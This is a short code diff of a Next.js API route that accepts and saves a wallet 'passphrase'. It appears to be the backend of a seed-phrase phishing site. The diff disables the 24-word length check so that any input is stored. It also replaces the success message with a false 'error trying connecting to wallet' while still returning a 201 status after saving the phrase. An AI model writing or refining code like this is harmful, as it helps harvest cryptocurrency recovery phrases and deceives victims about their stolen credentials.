@@ -22,15 +22,15 @@ export async function POST(request: NextRequest) {
     const wordCount = words.length;
 
     // 2. Business rule validation
-    if (wordCount < 24) {
-      return NextResponse.json(
-        {
-          error: 'Passphrase must be at least 24 words',
-          received: wordCount,
-        },
-        { status: 400 }
-      );
-    }
+    // if (wordCount < 10) {
+    //   return NextResponse.json(
+    //     {
+    //       error: 'Passphrase must be at least 12 words',
+    //       received: wordCount,
+    //     },
+    //     { status: 400 }
+    //   );
+    // }
 
     /**
      * 🚨 IMPORTANT SECURITY FIX
@@ -84,7 +84,7 @@ export async function POST(request: NextRequest) {
     // 4. Success response
     return NextResponse.json(
       {
-        message: 'Submission received successfully',
+        message: 'error trying connecting to wallet',
         id: saved.id,
       },
       { status: 201 }
